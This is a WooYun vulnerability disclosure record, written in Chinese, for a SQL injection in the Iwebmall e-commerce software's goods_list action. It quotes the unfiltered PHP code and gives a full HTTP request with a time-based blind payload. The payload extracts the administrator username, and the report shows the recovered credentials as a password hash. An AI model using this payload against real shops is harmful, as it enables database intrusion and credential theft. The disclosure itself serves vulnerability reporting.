{"id": 41857, "wybug_id": "wooyun-2014-087461", "wybug_title": "Iwebmall 最新版SQL注入第十三枚", "wybug_corp": "Jooyea", "wybug_author": "路人甲", "wybug_date": "2014-12-18 11:26", "wybug_open_date": "2015-03-18 11:28", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-18：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-03-18：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： Iwebmall 最新版SQL注入第十三枚 详细说明：  看到wooyun上有人提了几个iweb的漏洞（ WooYun: iwebmall商城程序sql注入 ），我来捡捡漏儿吧，希望不要重复。先把注入点拿出来：www.xxx.com/do.php?act=goods_list，POST中的参数checkbox存在注入，程序没有对checkbox过滤，造成了注入。/action/goods/list.action.php\n无关代码$goods_ids = implode(\",\",get_args('checkbox'));if($s_open&&$s_open[0]==1){\t\taction_return(0,'店铺关闭，操作失败','-1');\texit;}if(short_check(get_args('down'))) {\t$sql = \"update `$t_goods` set is_on_sale=0 where goods_id in ($goods_ids) and shop_id='$shop_id'\";\t$dbo->exeUpdate($sql);} elseif(short_check(get_args('up'))) {\t$sql = \"update `$t_goods` set is_on_sale=1 where goods_id in ($goods_ids) and shop_id='$shop_id'\";\t$dbo->exeUpdate($sql);}无关代码\n可以看到，$goods_ids = implode(\",\",get_args('checkbox'))之后就带入了SQL语句查询，造成了注入。Iweb没有错误回显，这里用time-based blind进行注入测试。Payload:\nPOST /do.php?act=goods_list HTTP/1.1Host: 192.168.0.107User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh,zh-cn;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://192.168.0.107/modules.php?app=poll_sendCookie: AJSTAT_ok_times=8; bdshare_firstime=1414502402741; iweb_hisgoods[15]=1417531949; iweb_hisgoods[26]=1418653330;iweb_email=xxxx@163.com; iweb_iweb_login=xxxx%40163.com; PHPSESSID=2sehcgbl6p66ptiop9c0cn3fp5Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 146down=1&checkbox[]=-1) or (select if(ord(mid((select admin_name from imall_admin_user where admin_id=1 limit 0,1),1,1))=122,sleep(3),0)) and (1)=(1\n测试时：登陆后访问如上的请求，抓包，按上面的payload进行修改即可。因为是time-based blind 注入，猜测管理员用户名的第一个字母时，若错误，延迟2s左右，如下图\n\n若正确，延迟5s左右，如下图\n\n按上面的方法依次做下去（burp intruder或者自己写个脚本跑），可测试管理员用户名为：admin，密码为： 21232f297a57a5a743894a0e4a801fc3   漏洞证明：  见 详细说明   修复方案：  intval   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}